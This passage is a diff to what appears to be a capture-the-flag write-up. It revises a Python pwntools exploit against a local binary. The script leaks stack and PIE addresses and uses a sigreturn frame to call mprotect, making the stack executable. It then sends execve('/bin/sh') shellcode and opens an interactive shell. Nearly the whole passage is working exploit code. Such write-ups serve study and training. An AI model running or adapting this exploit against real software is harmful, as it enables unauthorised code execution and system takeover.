@@ -95,73 +95,104 @@ Due to the NX bit and forbidden string filter, we use **Sigreturn-Oriented Progr
 
 ```python
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
 from pwn import *
-
 context.arch = 'amd64'
 context.os = 'linux'
-exe = context.binary = ELF('./main')
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or './main')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
 
 def start(argv=[], *a, **kw):
-    return process([exe.path] + argv, *a, **kw)
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
 
-gdbscript = 'continue\n'
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
 
 io = start()
 
-# Leak buf and vuln addresses
+#--------------------[ STEP 1 : PIE_BASE ]--------------------
+
 io.recvuntil(b'>> Secure channel established at ')
 leak_vals = io.recvline().split(b':')
-buf_addr = int(leak_vals[0], 16)
-vuln_addr = int(leak_vals[1].strip()[:-1], 16)
+log.success	(f"leak_vals : {leak_vals}")
+buf_addr = int(leak_vals[0],16)
+vuln_addr = int(leak_vals[1].strip()[:-1],16)
+log.success(f"buf @ : {hex(buf_addr)} ,, vuln @ : {hex(vuln_addr)}")
+pie_base = vuln_addr - exe.sym['vuln']
+exe.address = pie_base
+log.success(f"exe.address @ {hex(exe.address)}")
 
-log.success(f"buf @ {hex(buf_addr)}")
-log.success(f"vuln @ {hex(vuln_addr)}")
+#--------------------[ STEP 2 : MAKE STACk RWX WITH MPROTECT SYSCALL ]--------------------
 
-# Calculate PIE base
-exe.address = vuln_addr - exe.sym['vuln']
-log.success(f"PIE base @ {hex(exe.address)}")
-
-# Set up ROP and gadgets
+# Setup ROP and gadgets
 rop = ROP(exe)
-syscall_gadget = rop.find_gadget(['syscall'])[0]
+syscall_gad = rop.find_gadget(['syscall'])[0]
+ret_gad = rop.find_gadget(['ret'])[0]
 
-# Page-align stack address
+# Page align the buffer address for mprotect
 page_size = 0x1000
-aligned_stack = buf_addr & ~(page_size - 1)
+page_aligned_addr = buf_addr & ~(page_size - 1)
 
-# Create SigreturnFrame for mprotect
+# Build SigreturnFrame for mprotect syscall
 frame = SigreturnFrame()
-frame.rax = 10                 # mprotect
-frame.rdi = aligned_stack      # addr
-frame.rsi = page_size          # len
-frame.rdx = 7                  # PROT_READ | PROT_WRITE | PROT_EXEC
-frame.rsp = buf_addr           # pivot back to shellcode
-frame.rip = syscall_gadget     # syscall; ret
+frame.rax = 10            # syscall number for mprotect
+frame.rdi = page_aligned_addr  # page-aligned address
+frame.rsi = page_size     # length (one page)
+frame.rdx = 7             # PROT_READ | PROT_WRITE | PROT_EXEC
+frame.rip = syscall_gad   # syscall; ret gadget address
+frame.rsp = buf_addr  # new stack pointer after sigreturn
 
-# Custom shellcode (no forbidden strings)
+#--------------------[ STEP 3 : SHELLCODE ]--------------------
+
 shellcode = asm('''
     xor rsi, rsi
     push rsi
-    mov rdi, 0x68732f2f6e69622f  # "//bin/sh"
+    mov rdi, 0x68732f2f6e69622f
     push rdi
     mov rdi, rsp
     xor rdx, rdx
-    mov al, 59                  # execve syscall
+    mov al, 0x3b
     syscall
 ''')
 
-# Build payload
-offset = 16
-payload = p64(buf_addr + 8)         # new RIP (skip over dummy value)
-payload += shellcode
-payload += b'\x90' * (72 - len(payload))  # NOP padding
-payload += p64(syscall_gadget)      # trigger sigreturn
-payload += bytes(frame)             # actual frame
+#--------------------[ STEP 4 : PAYLOAD ]--------------------
 
-# Send payload
+offset = 16
+payload=p64(buf_addr+8)
+payload+= shellcode
+payload+= b'\x90' * (72 - len(payload) )
+payload+= p64(syscall_gad)
+payload+=bytes(frame)
+
 io.recvuntil(b'>> Root key required to proceed:\n')
 io.sendline(payload)
+
+
+
 io.interactive()
+
+
 ```
 
 ---
